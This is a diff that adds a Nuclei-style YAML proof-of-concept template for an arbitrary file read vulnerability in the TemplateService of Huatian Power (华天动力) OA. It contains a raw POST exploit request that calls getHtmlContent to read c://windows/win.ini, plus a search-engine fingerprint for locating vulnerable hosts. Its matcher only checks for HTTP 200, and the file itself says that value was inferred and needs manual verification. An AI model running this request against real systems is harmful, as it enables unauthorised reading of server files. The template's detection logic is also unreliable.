@@ -1,0 +1,38 @@
+id: poc-55e48721bcb6aca9771e
+info:
+  name: 华天动力OATemplateService存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/55e48721bcb6aca9771e7b7ec868046d
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 55e48721bcb6aca9771e7b7ec868046d
+    fofa: + hunter`app.name="华天软件 OA"`
+http:
+- raw:
+  - 'POST /OAapp/bfapp/buffalo/TemplateService HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
+
+    Content-Type: text/xml
+
+
+    <buffalo-call>
+
+    <method>getHtmlContent</method>
+
+
+    <string>c://windows/win.ini</string>
+
+
+    </buffalo-call>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
